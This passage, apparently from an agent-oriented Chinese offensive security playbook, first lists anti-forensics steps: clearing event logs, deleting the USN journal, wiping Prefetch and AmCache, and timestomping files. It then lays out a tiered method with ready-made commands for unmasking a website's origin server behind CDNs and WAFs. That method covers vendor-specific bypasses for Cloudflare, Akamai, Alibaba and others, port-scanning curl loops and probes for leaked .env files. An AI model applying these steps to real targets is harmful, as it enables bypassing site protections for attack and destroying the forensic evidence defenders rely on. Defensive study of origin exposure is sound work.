   - 选择性清除: 仅删除与操作相关的事件ID
   - EventLog服务暂停→修改→恢复

2. USN Journal清除:
   - fsutil usn deletejournal /D
   - 防止通过USN记录恢复已删文件

3. Prefetch清除:
   - 删除 C:\Windows\Prefetch 中相关文件
   - 防止通过Prefetch分析程序执行历史

4. ShimCache/AmCache清除:
   - 注册表 AppCompatCache 键值清除
   - AmCache.hve 文件清除
   - 防止通过兼容性缓存追溯程序执行

5. 注册表清除:
   - Run/RunOnce 键值清除
   - MUICache 清除
   - UserAssist 清除

6. 浏览器痕迹清除:
   - 历史记录/缓存/Cookie/下载记录
   - IndexedDB / LocalStorage / SessionStorage
   - 扩展存储数据

7. 时间戳伪造:
   - timestomp: 修改MACB时间戳
   - 匹配周围文件的时间戳模式
   - 防止通过时间戳异常发现修改
```

---

# Part II: CDN/WAF 溯源 (域B · v5.0)

> 源自 cdn-origin-tracing v5.0 · 50种溯源方法 · 51家CDN厂商 · 贝叶斯置信度评分

---


## §9. 核心原则与分层流水线

**单方法成功率有限，分层组合拳成功率 95%+。**

```
第一层(发现)  crt.sh证书 → 子域名枚举(含AltDNS) → 历史DNS聚合 → 被动DNS多源交叉
第二层(暴露)  网络空间引擎(Shodan/Censys/FOFA) → CSP/CORS/JS端点 → 云存储桶枚举
第三层(触发)  邮件头/Pingback → 缓存投毒/请求走私 → SaaS/Serverless源站发现
第四层(验证)  Host头验证 → JA3/JA4 TLS指纹 → HTTP/2 Akamai指纹 → 页面哈希一致性
```

**v5.0关键升级**: 将"验证"独立成层，避免传统方法只发现不验证导致的误报。Host头返回200 ≠ 源站（可能是CDN节点或共享主机），必须用JA3/JA4 + HTTP/2指纹交叉确认。

### 9.1 一键全流程溯源

```bash
# 全流程: 识别CDN → 证书 → 子域名 → 被动DNS → 邮件 → 过滤 → Host验证 → TLS指纹 → 页面哈希 → 贝叶斯评分
python cdn_tracer.py target.com
# 输出: 终端彩色排名表 + report_target_com_<时间戳>.json

# 常用参数
python cdn_tracer.py target.com --threads 30        # 提高并发
python cdn_tracer.py target.com -o result.json      # 指定输出
python cdn_tracer.py target.com --no-verify         # 仅被动发现(不直连,隐蔽)
python cdn_tracer.py target.com --no-fingerprint     # 跳过TLS/哈希(加速)
```

### 9.2 CDN IP段过滤

```bash
python cdn_ranges.py 104.16.1.1           # → CDN: Cloudflare (AS13335)
python cdn_ranges.py --filter 1.2.3.4 104.16.1.1 8.8.8.8  # 批量过滤
python cdn_ranges.py --dump > cdn.json    # 导出全部IP段
```

### 9.3 深度IP段收集 (8源并发 · 52,108段)

```bash
python cdn_ip_collector.py                # 全量拉取: 8源 → 52,108段
python cdn_ip_collector.py --vendor Cloudflare,"阿里云 CDN"
python cdn_ip_collector.py --merge > all_cdn_ranges.txt
```

---


## §10. 50种溯源方法矩阵

| # | 方法 | 成功率 | 速度 | 自动化 | 关键工具 |
|---|------|--------|------|--------|----------|
| 1 | SSL证书透明度日志 | 85% | 秒级 | 是 | crt.sh, Censys, CertSpotter |
| 2 | 子域名枚举 | 80% | 分钟级 | 是 | Subfinder, Amass, OneForAll |
| 3 | 历史DNS记录 | 75% | 秒级 | 是 | SecurityTrails, VirusTotal |
| 4 | 网络空间搜索引擎 | 70% | 秒级 | 是 | Shodan, FOFA, ZoomEye, Censys |
| 5 | CNAME解析链追踪 | 70% | 秒级 | 是 | dig |
| 6 | CDN IP范围反查 | 65% | 分钟级 | 部分 | cdn_ranges.py, ASN |
| 7 | SPF邮件记录 | 60% | 秒级 | 是 | dig |
| 8 | MX邮件服务器关联 | 55% | 秒级 | 是 | dig MX |
| 9 | Host头验证 | 55% | 分钟级 | 是 | curl, httpx |
| 10 | 第三方服务ID关联 | 50% | 分钟级 | 否 | Google Analytics, 百度统计 |
| 11 | 网站功能泄露 | 50% | 分钟级 | 否 | RSS, robots.txt, sitemap |
| 12 | ICP备案查询 | 45% | 秒级 | 否 | beian.miit.gov.cn |
| 13 | XML-RPC Pingback泄露 | 40% | 秒级 | 是 | curl, nc |
| 14 | 邮件头分析 | 45% | 分钟级 | 否 | 邮件客户端 |
| 15 | Favicon哈希匹配 | 40% | 分钟级 | 部分 | Shodan, FOFA, mmh3 |
| 16 | DNS ANY/搜索引擎缓存 | 35% | 秒级 | 部分 | dig ANY, Wayback Machine |
| 17 | IPv6解析 | 25% | 秒级 | 是 | nslookup -type=AAAA |
| 18 | DNS区域传送 | 15% | 秒级 | 是 | dig AXFR |
| 19 | AltDNS排列+泛解析过滤 | 45% | 分钟级 | 是 | altdns, dnsgen |
| 20 | 多DNS解析器交叉验证 | 60% | 秒级 | 是 | dnsx, massdns |
| 21 | CSP/CORS头泄露 | 40% | 秒级 | 是 | curl |
| 22 | CDN回源IP段利用 | 55% | 分钟级 | 是 | CDN文档, nmap |
| 23 | JavaScript/API端点泄露 | 45% | 分钟级 | 半自动 | curl, grep |
| 24 | 被动DNS数据聚合 | 80% | 秒级 | 是 | 多源聚合 |
| 25 | 证书颁发机构分析 | 50% | 秒级 | 是 | crt.sh, openssl |
| 26 | HTTP重定向链分析 | 35% | 秒级 | 是 | curl -L |
| 27 | Cloudflare Tunnel绕过 | 35% | 分钟级 | 半自动 | dig, cloudflared配置 |
| 28 | Cloudflare Pages/Workers暴露 | 45% | 秒级 | 是 | crt.sh, *.pages.dev |
| 29 | Serverless/Lambda@Edge泄露 | 40% | 分钟级 | 半自动 | 日志触发, 错误页 |
| 30 | HTTP/3 (QUIC)源站发现 | 30% | 秒级 | 是 | curl --http3 |
| 31 | TLS 1.3 ECH/SNI操纵 | 25% | 秒级 | 是 | openssl, curl --doh-url |
| 32 | 容器/K8s Ingress暴露 | 40% | 分钟级 | 半自动 | Shodan, FOFA |
| 33 | CI/CD管道泄露 | 35% | 分钟级 | 是 | .git泄露, GitHub dork |
| 34 | 云存储桶枚举 | 50% | 分钟级 | 是 | lazarus, bucket_finder |
| 35 | WebSocket长连接源站 | 30% | 分钟级 | 是 | wscat, websocat |
| 36 | 缓存投毒/欺骗取源站 | 25% | 分钟级 | 半自动 | 路径操纵 |
| 37 | HTTP请求走私 | 20% | 分钟级 | 半自动 | smuggler, CL.TE/TE.CL |
| 38 | GraphQL Introspection泄露 | 35% | 秒级 | 是 | curl, graphw00f |
| 39 | SSE/Server-Sent Events源站 | 25% | 分钟级 | 是 | curl, EventSource |
| 40 | 移动App/小程序硬编码IP | 45% | 分钟级 | 是 | jadx, apktool, Frida |
| 41 | DNS Rebinding→SSRF | 40% | 分钟级 | 半自动 | singularity, rbndr |
| 42 | CDN缓存清除/预热回源泄露 | 35% | 分钟级 | 是 | CDN管理面板 |
| 43 | HTTP/2 HPACK压缩侧信道 | 25% | 分钟级 | 半自动 | h2load, h2spec |
| 44 | Anycast IP去匿名化 | 30% | 分钟级 | 是 | 多地ping, 全球VPS |
| 45 | CDN Origin Shield绕过 | 35% | 分钟级 | 半自动 | 请求路由操纵 |
| 46 | 速率限制差分分析 | 30% | 分钟级 | 半自动 | ffuf, 并发脚本 |
| 47 | eBPF/XDP源站旁路检测 | 20% | 分钟级 | 否 | bpftrace, cilium |
| 48 | 跨域资源计时侧信道 | 25% | 分钟级 | 半自动 | Performance API |
| 49 | 源站IP漂移实时追踪 | 50% | 分钟级 | 是 | cdn_ranges monitor |
| 50 | CDN回源认证绕过 | 30% | 分钟级 | 半自动 | Hashcat, 签名分析 |

---


## §11. 四维指纹验证体系 (v5.0核心)

### 11.1 JA3/JA4 TLS客户端指纹

```
原理: 每个TLS客户端(浏览器/服务器)有独特的JA3指纹，由以下字段MD5生成:
  - TLS Version
  - Cipher Suites (按顺序)
  - Extensions (按顺序)
  - Elliptic Curves
  - Elliptic Curve Point Formats

验证流程:
  1. 从CDN节点获取目标域名的JA3指纹
  2. 直接连接候选源站IP，获取其JA3指纹
  3. 如果JA3一致 → 强烈证据表明是同一后端
  4. JA4 (2024新版): 增加HTTP版本/ALPN/SNI等维度，更精确

工具:
  tshark -r capture.pcap -T fields -e tls.handshake.ja3
  python ja3extract.py --target origin_ip:443
```

### 11.2 HTTP/2 Akamai指纹

```
原理: HTTP/2连接建立时，服务端发送SETTINGS帧，包含:
  - SETTINGS_MAX_CONCURRENT_STREAMS
  - SETTINGS_INITIAL_WINDOW_SIZE
  - SETTINGS_MAX_FRAME_SIZE
  - SETTINGS_MAX_HEADER_LIST_SIZE
  - SETTINGS_ENABLE_PUSH

不同CDN/源站的SETTINGS组合不同，形成"HTTP/2指纹":
  Cloudflare: MAX_STREAMS=128, WINDOW=65536, PUSH=0
  Akamai:     MAX_STREAMS=100, WINDOW=2097152, PUSH=1
  自建Nginx:  MAX_STREAMS=128, WINDOW=65536, PUSH=1

验证: 直接连接候选源站 → 解析SETTINGS帧 → 与CDN节点对比
```

### 11.3 TCP/IP指纹

```
原理: 不同操作系统和内核版本的TCP/IP栈有不同特征:
  - TTL初始值 (Linux=64, Windows=128, Cisco=255)
  - TCP Window Size
  - TCP Options顺序和值 (MSS/SACK/Timestamp/WindowScale)
  - DF (Don't Fragment) 标志

用途: 区分CDN边缘节点(Linux)和源站(可能是Windows Server)
```

### 11.4 证书钉刺 (Certificate Pinning)

```
原理: 比较CDN返回的证书和源站直接返回的证书:
  - Subject Public Key Info (SPKI) 哈希
  - 证书链中的中间CA
  - 证书序列号
  - 证书有效期

验证: openssl s_client -connect origin_ip:443 | openssl x509 -noout -fingerprint
```

### 11.5 验证决策矩阵

| 指纹维度 | 匹配 | 不匹配 | 权重 |
|---------|------|--------|------|
| JA3/JA4 | 强证据(源站) | 排除(不同后端) | 35% |
| HTTP/2 SETTINGS | 强证据 | 弱排除 | 25% |
| TCP/IP | 中等证据 | 弱排除 | 20% |
| 证书SPKI | 决定性证据 | 排除 | 20% |

---


## §12. 贝叶斯加权置信度评分

### 12.1 证据分组与权重 (对数似然比LLR)

```python
# 6个独立维度的LLR值 (单位: logit)
LLR = {
    'A_cert':       {'hit': +2.5, 'miss': -1.0},  # 证书透明度
    'B_dns_history':{'hit': +2.0, 'miss': -0.8},  # 历史DNS
    'C_subdomain':  {'hit': +1.8, 'miss': -0.5},  # 子域名关联
    'D_mail':       {'hit': +1.5, 'miss': -0.3},  # 邮件头/SPF/MX
    'E_fingerprint':{'hit': +3.0, 'miss': -1.5},  # TLS/HTTP2指纹
    'F_space_engine':{'hit': +2.0, 'miss': -0.7},  # 网络空间引擎
}
PRIOR_LOGIT = -2.0  # 先验: 任意IP是源站的概率约12%
```

### 12.2 贝叶斯评分脚本

```python
import math

def score(ip, evidence):
    logit = PRIOR_LOGIT  # 先验概率
    details = []
    for dim, llr in LLR.items():
        hit = evidence.get(dim, False)
        delta = llr['hit'] if hit else llr['miss']
        logit += delta
        details.append(f"{dim}: {'HIT' if hit else 'miss'} ({delta:+.1f})")
    prob = 1 / (1 + math.exp(-logit))  # logit转概率
    return prob, details

# 判定阈值:
# P >= 0.95 → 几乎确定源站 → 直接确认
# 0.80 <= P < 0.95 → 高度疑似 → 补TLS/哈希指纹确认
# 0.50 <= P < 0.80 → 可疑 → 需Shodan/FOFA补证
# P < 0.50 → 排除
```

### 12.3 输出解读

```
排名  IP               置信度    TLS差异  哈希一致  判定
----------------------------------------------------------------------
1     203.0.113.5      97.3%     ✓        ✓        几乎确定源站   ← P≥0.95
2     198.51.100.10    84.2%     ✓        -        高度疑似源站   ← 补指纹确认
3     192.0.2.7        42.1%     -        -        可疑           ← 排除或补证

Top 1 证据:
  A_cert: ✓   B_dns_history: ✓   C_subdomain: ✓
  D_mail: ✗   E_fingerprint: ✓   F_space_engine: ✓
```

---


## §13. CDN厂商IP段数据库 (51家 · v5.0)

### 13.1 国际CDN厂商 (部分)

| CDN厂商 | ASN | 识别特征 |
|---------|-----|---------|
| Cloudflare | AS13335 | cf-ray, cf-cache-status, server: cloudflare |
| Amazon CloudFront | AS16509 | x-amz-cf-id, x-amz-cf-pop, via: CloudFront |
| Akamai | AS20940/AS16625 | X-Akamai-*, AkamaiGHost |
| Fastly | AS54113 | X-Served-By, X-Cache, via: Fastly |
| Google Cloud CDN | AS15169 | Server: Google Frontend, via: 1.1 google |
| Azure Front Door | AS8075 | x-azure-ref, Server: Microsoft-Azure |
| Imperva Incapsula | AS19551 | X-CDN, X-Iinfo, via: Imperva |
| Sucuri | AS399758 | X-Sucuri-ID, server: Sucuri/Cloudproxy |
| StackPath | AS33438 | X-StackPath-*, via: stackpath |
| BunnyCDN | AS200919 | X-BunnyCDN-*, server: BunnyCDN |

### 13.2 国内CDN厂商 (部分)

| CDN厂商 | ASN | 识别特征 |
|---------|-----|---------|
| 阿里云CDN | AS37963 | via: alicdn, server: Tengine |
| 腾讯云CDN/EdgeOne | AS45090/AS133478 | X-NWS-LOG-UUID, edgeone |
| 百度云加速 | AS38365 | Server: bfe, YJS-* |
| 又拍云 | AS48024 | X-Upyun-*, via: upyun |
| 七牛云 | AS9801/AS4812 | X-Qiniu-*, server: qiniu |
| 网宿 | AS4811/AS9801 | X-WS-*, via: wangsu |
| 华为云CDN | AS136990 | X-HW-*, server: hcdn |
| 火山引擎CDN | AS137673 | X-Volc-*, server: volc-cache |
| 金山云 | AS59019 | X-KSCDN-*, X-Cache |

### 13.3 深度收集 (8源并发)

| 源 | 覆盖 | 可靠性 |
|----|------|--------|
| Cloudflare ips-v4/v6 | CF边缘节点 | 官方, 最准 |
| AWS CloudFront JSON | CF全球边缘 | 官方, 最全 |
| Fastly public-ip-list | Fastly边缘 | 官方 |
| Azure ServiceTags | FrontDoor/CDN | 官方 |
| GCP Cloud IP Ranges | Google Cloud | 官方 |
| bgpview.io ASN | 所有40+ ASN | 第三方, 含历史 |
| RIPE Stat API | 所有40+ ASN | 权威, 当前BGP |
| RADB whois | 所有40+ ASN | 权威, 可能不全 |

---


## §14. 决策树与反规避

### 14.1 按目标画像选择溯源路径

```
目标画像判断:
  ├─ Cloudflare Tunnel (无A记录/无IP)
  │   └→ 方法27(cloudflared配置泄露) + 方法41(DNS Rebinding) + 方法28(Pages/Workers)
  ├─ 国内站 (ICP备案/国内CDN)
  │   └→ 方法12(ICP备案) + 方法34(云存储桶) + 方法20(多DNS交叉)
  ├─ AWS架构 (x-amz-cf-id)
  │   └→ 方法29(Serverless) + 方法34(S3桶) + 方法32(K8s Ingress)
  ├─ Serverless (无固定IP/函数计算)
  │   └→ 方法29(Lambda@Edge) + 方法43(HPACK侧信道) + 方法28(Workers)
  ├─ 容器/K8s (多端口/Ingress)
  │   └→ 方法32(K8s Ingress) + 方法4(Shodan端口扫描) + 方法33(CI/CD泄露)
  ├─ 移动App (API调用)
  │   └→ 方法40(硬编码IP) + 方法35(WebSocket) + 方法39(SSE)
  └─ WordPress (wp-content/pingback)
      └→ 方法13(Pingback) + 方法11(功能泄露) + 方法1(WP证书)
```

### 14.2 反规避与防御感知

```
防御机制识别:
  1. SNI过滤: 源站仅允许CDN回源IP + 特定SNI
     绕过: TLS 1.3 ECH + DoH + 直接IP连接(无SNI)
  2. 伪造CDN回源IP头: 源站伪造X-Forwarded-For
     绕过: 对比真实TCP连接IP与声称的回源IP
  3. IPv6绕过: CDN仅代理IPv4，源站有IPv6
     绕过: nslookup -type=AAAA target.com
  4. 地理围栏: 源站仅允许特定地区IP
     绕过: 全球VPS分布式探测

蜜罐识别清单:
  - 返回200但内容为空/默认页
  - 响应时间异常快(<10ms) → 可能是CDN缓存蜜罐
  - 证书CN与域名不匹配
  - HTTP/2 SETTINGS与声称的服务器不符
  - TTL值与声称的OS不匹配
```

### 14.3 持续监控与漂移检测

```bash
# 源站IP漂移检测
python cdn_origin_monitor.py target.com --interval 3600
# 检测: 新IP出现/旧IP消失/证书变更/DNS记录变化
```

---


## §14A. P0-P4 优先级分层执行框架 (v1.3 融合 FUCK-CDN)

> **融合 FUCK-CDN 的优先级分层 + 早停/晚停/死磕机制**，将50种方法重组为5个优先级梯队，实现 Token 最优 + 命中率最大化。

### 14A.1 优先级分层矩阵

| 优先级 | 方法类别 | Token成本 | 命中率 | 对应方法# | 说明 |
|--------|---------|-----------|--------|----------|------|
| **P0** | 快速低成本 | 极低 | 高 | #3,5,7,8,17,20 | DNS记录泄露、SPF/MX、历史DNS回溯、IPv6、多DNS交叉 |
| **P1** | 中等成本 | 中 | 中高 | #1,2,19,9,21,25,26 | SSL证书比对、子域名枚举、AltDNS、Host头、CSP/CORS、CA分析、重定向链 |
| **P2** | 较高成本 | 较高 | 中 | #4,15,6,24,10,11,12,34 | 空间搜索引擎、Favicon/Body Hash、CDN IP反查、被动DNS、GA ID、ICP备案、云存储桶 |
| **P3** | 高成本/手动 | 高 | 低 | #13,14,23,33,38,40,35,39,29,27,28 | 邮件触发、源码审计、JS端点、CI/CD、GraphQL、App硬编码、WebSocket、SSE、Serverless、CF Tunnel |
| **P4** | 深度挖掘 | 极高 | 不定 | 见§14E | Web考古、云元数据、WAF穿透、时间攻击、社工情报、拓扑推断、国际差异 |

### 14A.2 执行策略（早停/晚停/死磕）

```
┌──────────────────────────────────────────────────────────────────┐
│                    P0-P4 执行决策流程                              │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  P0 全部并行执行 (6种方法, 极低Token)                              │
│    ├─ 有候选IP? ──→ 进入验证阶段 (§11 四维指纹)                    │
│    └─ 无候选 ──→ 继续 P1                                          │
│                                                                  │
│  P1 全部并行执行 (7种方法, 中等Token)                              │
│    ├─ 有候选IP? ──→ 进入验证阶段                                   │
│    └─ 无候选 ──→ 继续 P2                                          │
│                                                                  │
│  P2 全部并行执行 (8种方法, 较高Token)                              │
│    ├─ 有候选IP? ──→ 进入验证阶段                                   │
│    └─ 无候选 ──→ 继续 P3                                          │
│                                                                  │
│  P3 逐个执行 (11种方法, 高Token, 手动辅助)                         │
│    ├─ 有候选IP? ──→ 进入验证阶段                                   │
│    └─ 无候选 ──→ 继续 P4                                          │
│                                                                  │
│  P4 深度挖掘 (9种非常规手段, 见§14E)                               │
│    ├─ 有候选IP? ──→ 进入验证阶段                                   │
│    └─ 仍无候选 ──→ 输出"未能确定"报告 + 后续建议                    │
│                                                                  │
│  ★ 早停机制: P0/P1 已有 2+ 独立来源交叉确认同一IP                   │
│    → 直接进入验证阶段, 不必穷尽 P2/P3                              │
│  ★ 晚停兜底: P2 仍无候选才执行全部 P3                              │
│  ★ 死磕到底: P0-P3 + CDN特定绕过 + 通用兜底全失败                   │
│    → 进入 P4 深度挖掘, 穷尽一切非常规手段                           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 14A.3 P0 快速命中（必须全部并行执行）

```bash
# P0-1: SPF/MX/TXT 记录直接泄露
nslookup -type=TXT <root_domain>          # v=spf1 ip4:x.x.x.x → 源站IP
nslookup -type=MX <root_domain>           # 邮件服务器可能就是源站
nslookup -type=TXT _dmarc.<root_domain>   # DMARC报告地址
nslookup -type=TXT _spf.<root_domain>     # SPF子记录

# P0-2: IPv6 记录 (很多站只给IPv4接了CDN)
nslookup -type=AAAA <target>
nslookup -type=AAAA <root_domain>

# P0-3: 历史 DNS 回溯 (最高命中率)
#   ipchaxun.com / site.ip138.com / SecurityTrails API
#   找最早的A记录IP — 通常是CDN接入前的源站
#   找CDN启用时间拐点 — 拐点前后IP数量暴增

# P0-4: 基础DNS + CDN识别 (画像用)
nslookup <target>                        # CNAME链 → 识别CDN类型
nslookup -type=NS <root_domain>          # DNS托管商
nslookup -type=SOA <root_domain>         # 权威DNS

# P0-5: 多DNS解析器交叉验证
#   用8.8.8.8/1.1.1.1/114.114.114.114/208.67.222.222解析对比
#   不同解析器返回不同IP → CDN; 全部相同单IP → 可能无CDN

# P0-6: HTTP响应头泄露检测
curl -sI https://<target> | grep -iE "(x-real-ip|x-forwarded-for|x-origin-ip|x-backend-server|x-upstream-addr|x-served-by)"
# 这些头可能直接暴露源站IP（配置不当的CDN/反代）
```

**P0结果判断**: 有候选IP → 验证阶段 | 无候选 → 继续 P1

### 14A.4 证据分级标记

每个P0-P4步骤的发现必须标注证据强度：

| 等级 | 名称 | 典型证据 | 贝叶斯权重 |
|------|------|---------|-----------|
| **S** | 决定性 | SSL证书序列号匹配+默认证书不同+Server头差异 | 直接确认(P≥0.95) |
| **A** | 强佐证 | 历史DNS直接确认/IP反查绑定/空间引擎命中 | LLR +2.0~+3.0 |
| **B** | 佐证 | SPF包含/子域名解析/同C段关联/GA ID关联 | LLR +1.0~+1.8 |
| **C** | 弱线索 | 搜索引擎提及/同组织域名/JS端点 | LLR +0.3~+0.8 |
| **X** | 已排除 | 确认CDN节点/无关服务器/已下线 | LLR -1.0~-1.5 |

---


## §14B. CDN厂商专项深度绕过 (v1.3 新增 · 12家厂商)

> **融合 FUCK-CDN 的厂商特定绕过技术**，根据§14A的P0-4 CDN识别结果，执行对应厂商的专项绕过。

### 14B.1 Cloudflare 专项绕过

```bash
# 1. 非代理端口直达 (CF仅代理特定端口)
#    HTTP代理: 80,8080,8880,2052,2082,2086,2095
#    HTTPS代理: 443,2053,2083,2087,2096,8443
#    其他端口(21,22,25,8888,9090,3306,5432)不经过CF
for port in 21 22 25 8888 9090 3306 5432; do
  curl -sI -m 2 http://<target>:$port 2>&1 | head -3
done

# 2. CrimeFlare/CloudFlair 数据库查询
# WebSearch: "<root_domain>" site:crimeflare.org
# WebSearch: "<root_domain>" cloudflare bypass real IP

# 3. direct-connect 子域名探测
curl -sI "https://direct.<root_domain>"
curl -sI "https://direct-connect.<root_domain>"
curl -sI "https://origin.<root_domain>"

# 4. CF不代理非HTTP协议 (FTP/SSH/SMTP直达源站)
# 5. 老旧DNS记录 (CF接入前的A记录)
# 6. CF Partner CNAME接入泄露
# 7. Cloudflare Tunnel (cloudflared) 配置泄露 → 方法27
# 8. Cloudflare Pages/Workers/R2 源站暴露 → 方法28
# 9. CF Workers subrequest header 伪造 (X-Forwarded-For)
```

### 14B.2 腾讯 EdgeOne 专项绕过

```bash
# 特征: CNAME *.eo.dnse5.com, Server: TencentEdgeOne
# HTTP 567 = WAF拦截, HTTP 418 = 无匹配域名

# 1. 网络层保护绕过: 直连源站IP+Host头可能仍被拦截(返回567)
#    判定: IP对域名返回567但直连返回nginx/apache → 这是源站
# 2. 源站通常在腾讯云CVM
#    常见网段: 101.32-35.x.x, 43.x.x.x, 49.x.x.x, 118.x.x.x, 129.x.x.x
#    历史+IP反查在这些段内 → 重点验证
# 3. EdgeOne SSL证书由EdgeOne管理, 源站可能部署相同证书(自动同步)
# 4. EdgeOne回源IP段可枚举 (查腾讯云文档)
# 5. EdgeOne边缘函数(EIF)日志泄露
```

### 14B.3 阿里云 CDN/DCDN 专项绕过

```bash
# 特征: CNAME *.cdngslb.com / *.alikunlun.com / *.tbcache.com
# 响应头: Server: Tengine, EagleId, Via: cache*.cn

# 1. 回源Host配置差异: 回源Host≠加速域名时, 用回源Host访问源站IP可绕过
# 2. 源站通常在ECS
#    常见网段: 47.x.x.x, 39.x.x.x, 120.x.x.x, 121.x.x.x, 106.x.x.x
# 3. OSS Bucket源站: CNAME含oss-cn-*.aliyuncs.com → 源站是OSS(非传统服务器)
# 4. 函数计算/Serverless源站: FC无固定IP, 需用方法29
# 5. DCDN的WebSocket配置泄露: 检查ws://连接是否绕过DCDN
# 6. 阿里云HTTPDNS (203.107.1.0/24) 探测
```

### 14B.4 AWS CloudFront 专项绕过

```bash
# 特征: CNAME *.cloudfront.net, Via: *.cloudfront.net, X-Amz-Cf-*

# 1. CloudFront仅代理HTTP/HTTPS, SSH/FTP/其他端口不代理
# 2. S3 Bucket源站: <bucket>.s3.amazonaws.com → 直接访问S3 endpoint
# 3. ALB/ELB源站: DNS枚举可能找到直接的ALB域名
# 4. AWS IP段筛选: https://ip-ranges.amazonaws.com/ip-ranges.json
#    筛选service=EC2的段缩小范围
# 5. 旧SSL证书可能在ACM中有记录
# 6. Lambda@Edge源站: 查CloudFront分布日志
# 7. CloudFront Origin Access Identity (OAI) 绕过
```

### 14B.5 Azure CDN/Front Door 专项绕过

```bash
# 特征: CNAME *.azureedge.net / *.azurefd.net, X-Azure-Ref

# 1. Azure源站在Azure VM: *.cloudapp.azure.com
# 2. Front Door后端池探测: health probe路径暴露后端信息
# 3. 非标准端口不代理
# 4. Azure ServiceTags IP段筛选
# 5. App Service源站: *.azurewebsites.net (可能未接CDN)
# 6. Front Door routing rule配置不一致
```

### 14B.6 Akamai 专项绕过

```bash
# 特征: CNAME *.akamaiedge.net / *.akamai.net, X-Akamai-*

# 1. SureRoute Test Object: /_akamai/sureroute-test-object.html
# 2. Akamai Ghost头 (Pragma调试):
curl -sI -H "Pragma: akamai-x-cache-on, akamai-x-get-true-cache-key, akamai-x-check-cacheable, akamai-x-get-extracted-values" https://<target>
# 3. Akamai staging网络: *.akamaiedge-staging.net → 调试信息
# 4. Akamai EdgeWorker日志泄露
# 5. Origin Shield绕过: 请求路由操纵
```

### 14B.7 Fastly 专项绕过

```bash
# 特征: CNAME *.fastly.net, X-Fastly-Request-ID, X-Served-By

# 1. Fastly使用Anycast, 所有节点共享IP池 (nslookup返回少量固定IP)
# 2. X-Served-By头泄露cache节点信息
# 3. Fastly Shield配置暴露源站区域
# 4. Fastly VCL配置泄露 (错误页面)
# 5. Fastly Compute@Edge (WASM) 日志
```

### 14B.8 Imperva/Incapsula 专项绕过

```bash
# 特征: CNAME *.incapdns.net, X-CDN: Incapsula, X-Iinfo

# 1. 回源可能不验证Host → 直接IP访问返回源站内容
# 2. X-Iinfo头包含session信息, 可能泄露源站标识
# 3. Incapsula仅代理80和443 → 非标准端口直达
# 4. Imperva Cloud WAF规则差异测试
```

### 14B.9 Sucuri WAF 专项绕过

```bash
# 特征: CNAME *.sucuri.net, X-Sucuri-*

# 1. Firewall通常只代理80/443 → 非标准端口直达源站
# 2. Sucuri接入前的DNS记录通常就是源站IP
# 3. X-Sucuri-Cache头分析
# 4. Sucuri代理IP段固定, 可精确排除
```

### 14B.10 华为云 CDN 专项绕过

```bash
# 特征: CNAME *.cdnhwc*.com, X-HW-*

# 1. 源站通常在华为云ECS → 历史+IP反查确认
# 2. X-HW-Via调试头包含节点信息
# 3. 华为云CDN回源IP段可枚举
# 4. WAF规则差异: HTTP方法/路径混淆
```

### 14B.11 网宿 CDN 专项绕过

```bash
# 特征: CNAME *.wscloudcdn.com / *.ourwebpic.com, X-Ws-Request-Id

# 1. 国内老牌CDN, 早期配置可能有缺陷
# 2. 网宿节点IP通常在运营商网段
# 3. 历史DNS回溯效果好
# 4. 网宿WSA API接口泄露
```

### 14B.12 百度云 CDN 专项绕过

```bash
# 特征: CNAME *.baidustatic.com / *.bdydns.com / *.bcebos.com

# 1. BCH(百度云虚机)源站探测
# 2. BOS(百度对象存储)源站: 直接访问BOS endpoint
# 3. 百度云加速历史DNS泄露率较高
# 4. 百度智能云IP段: 180.76.x.x, 182.61.x.x, 106.38.x.x
```

---


## §14C. 通用CDN兜底策略 (v1.3 新增)

> 当CNAME/响应头无法匹配任何已知厂商时执行。

### 14C.1 CDN类型识别三步法

```bash
# 步骤1: CNAME链追踪
nslookup -type=CNAME <target>
# 将末端域名WebSearch确认是哪家CDN

# 步骤2: HTTP响应头指纹采集
curl -sI https://<target> | grep -iE "^(Server|Via|X-CDN|X-Cache|X-Served-By|X-Edge|CF-RAY|X-Amz|X-HW|X-Swift|X-Varnish|Powered-By):"

# 步骤3: IP归属ASN查询
curl -s "https://ipinfo.io/<cdn_node_ip>/json" | grep -E "(org|asn)"
# ASN名称通常直接包含CDN厂商名
```

### 14C.2 通用绕过五步法

```bash
# 1. 非标准端口扫描 (绝大多数CDN只代理80/443)
for port in 21 22 25 81 888 2222 3000 3306 4443 5432 5900 6379 8000 8080 8443 8888 9090 9443; do
  result=$(curl -sI -m 2 http://<target>:$port 2>&1 | head -3)
  [ -n "$result" ] && echo "Port $port: $result"
done

# 2. 直接IP访问行为差异
#    CDN节点: 返回403/421/418/502或CDN自定义错误
#    源站: 返回200/301/nginx-apache默认页
curl -sI -k https://<candidate_ip>
curl -sI http://<candidate_ip>

# 3. 协议层绕过 (CDN不代理SSH/FTP/SMTP)
timeout 3 bash -c "echo | curl -s -m 3 telnet://<candidate_ip>:22" 2>&1 | head -1
timeout 3 bash -c "echo | curl -s -m 3 telnet://<candidate_ip>:21" 2>&1 | head -1

# 4. EDNS Client Subnet绕过
dig +subnet=0.0.0.0/0 <target> @8.8.8.8

# 5. HTTP vs HTTPS差异
#    某些小众CDN仅保护主域名, www/子域名可能未接入
#    或CDN仅覆盖HTTPS而HTTP直连源站
curl -sI http://<target>     # HTTP可能未走CDN
curl -sI https://<target>    # HTTPS走CDN
# 对比两者Server头和响应IP
```

---


## §14D. P4 深度挖掘九大技术 (v1.3 新增 · 融合 FUCK-CDN)

> **触发条件**: P0-P3 通用方法 + CDN特定绕过(§14B) + 通用兜底(§14C) 均未产出可验证候选IP。进入此阶段意味着目标防护极强，需要动用一切非常规手段。

### 14D.1 Web Archive 时间线考古

```bash
# 1. Wayback Machine CDX API (历史快照)
# WebFetch: https://web.archive.org/cdx/search/cdx?url=<target>&output=json&fl=timestamp,original,statuscode,mimetype&collapse=digest&limit=50

# 2. 分析历史快照中的资源引用
#    早期快照可能包含源站IP的直接引用(JS/CSS/图片URL)
#    重点关注CDN接入前的状态
# WebFetch: https://web.archive.org/web/20240101000000*/<target>

# 3. 历史快照响应头 (部分存储在CDX中, 可能包含源站IP)
# WebFetch: https://web.archive.org/cdx/search/cdx?url=<target>&output=json&fl=timestamp,original,statuscode,digest&filter=statuscode:200&limit=20

# 4. 历史DNS与Wayback交叉: 找到CDN接入前的时间点 → 获取该时间点的A记录
```

### 14D.2 源码与配置文件深度审计

```bash
# 1. 常见泄露路径逐一探测
for path in \
  "/.env" "/.env.bak" "/.env.production" "/.env.local" \
